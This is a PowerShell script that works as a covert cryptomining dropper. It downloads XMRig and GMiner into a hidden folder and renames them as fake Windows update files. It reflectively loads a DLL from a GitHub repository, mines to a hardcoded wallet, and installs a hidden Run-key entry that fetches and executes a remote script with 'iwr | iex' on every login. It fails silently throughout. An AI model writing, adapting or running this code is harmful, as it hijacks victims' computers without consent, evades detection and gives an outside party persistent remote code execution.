# --- CONFIGURATION ---
$GithubUser = "HolyV200"
$RepoName = "btcminer-"
$DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll"
$MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$GpuMinerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
$Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr.$env:COMPUTERNAME"

# --- STEALTH SETUP ---
$StealthDir = "$env:LOCALAPPDATA\WinSysUpdates"
if (-not (Test-Path $StealthDir)) {
    New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
}

$CpuZip = Join-Path $StealthDir "update_c.zip"
$GpuZip = Join-Path $StealthDir "update_g.zip"
$CpuExe = Join-Path $StealthDir "win_sys_x.exe"
$GpuExe = Join-Path $StealthDir "win_sys_g.exe"

try {
    $wc = New-Object System.Net.WebClient

    # 1. Handle CPU Miner
    if (-not (Test-Path $CpuExe)) {
        $wc.DownloadFile($MinerUrl, $CpuZip)
        Expand-Archive -Path $CpuZip -DestinationPath $StealthDir -Force
        Remove-Item $CpuZip -Force
        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
        Move-Item $Unzipped.FullName -Destination $CpuExe -Force
    }

    # 2. Check for NVIDIA GPU & Handle GPU Miner
    $GpuDetected = $null
    try {
        $vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
        if ($vc) {
            $GpuDetected = $vc | Where-Object { $_.Name -match "NVIDIA" -or $_.PNPDeviceID -match "VEN_10DE" }
        }
    } catch { }

    if ($GpuDetected -and -not (Test-Path $GpuExe)) {
        $wc.DownloadFile($GpuMinerUrl, $GpuZip)
        Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force
        Remove-Item $GpuZip -Force
        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "miner.exe" -Recurse | Select-Object -First 1
        Move-Item $Unzipped.FullName -Destination $GpuExe -Force
    }

    # --- REFLECTIVE LOADING ---
    $dllBytes = $wc.DownloadData($DllUrl)
    $assembly = [System.Reflection.Assembly]::Load($dllBytes)
    $loader = $assembly.GetType("DateFundLoader")
    $startMethod = $loader.GetMethod("StartMiner")
    
    # Pass the actual GPU path if detected, otherwise null
    $GpuArg = if ($GpuDetected) { $GpuExe } else { "" }
    $startMethod.Invoke($null, @($CpuExe, $GpuArg, $Wallet))
    
    # --- PERSISTENCE ---
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $Name = "WinSysUpdater"
    $Value = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iwr -useb https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1 | iex`"" 
    Set-ItemProperty -Path $RegPath -Name $Name -Value $Value
    
} catch {
    # Fail silently
}
